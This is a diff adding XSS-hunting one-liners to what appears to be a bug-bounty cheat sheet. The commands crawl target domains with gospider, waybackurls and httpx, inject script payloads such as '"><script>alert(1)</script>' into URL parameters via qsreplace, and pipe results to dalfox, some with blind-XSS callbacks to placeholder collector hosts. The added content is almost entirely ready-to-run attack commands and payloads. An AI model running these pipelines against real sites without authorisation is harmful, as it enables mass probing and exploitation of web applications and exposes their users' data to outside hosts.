@@ -939,6 +939,26 @@ python3 paramspider.py -d https://target.com -s TRUE -e ttf,woff,eot,svg,css | d
 ```bash
 gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
 ```
+* Wayback + httpx + GF + Dalfox
+```bash
+cat domains.txt | httpx -silent -ports 80,443,8080,8443,3000,8000 | waybackurls | grep "=" | uro | gf xss | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -q "<script>alert(1)</script>" && echo "[XSS] $url"; done
+```
+* Gospider + Dalfox
+```bash
+gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -oP "https?://[^ ]+" | grep "=" | qsreplace -a | dalfox pipe
+```
+* Wayback + GF + Blind XSS via Dalfox
+```bash
+waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u | dalfox -b yoursubdomain.xss.ht pipe
+```
+* Gospider + Dalfox (Deep Crawl)
+```bash
+gospider -S targets.txt -c 20 -d 3 --js --sitemap --robots | grep -oP "https?://[^\s']+" | grep "=" | uro | dalfox pipe -o gospider_xss.txt
+```
+* Dalfox Direct with Blind XSS
+```bash
+cat urls.txt | dalfox pipe -b yourdomain.xss
+```
 
 * [XSSTRON](https://github.com/RenwaX23/XSSTRON) - Powerful Chromium Browser to find XSS Vulnerabilites automatically while browsing web, it can detect many case scenarios with support for POST requests too
 
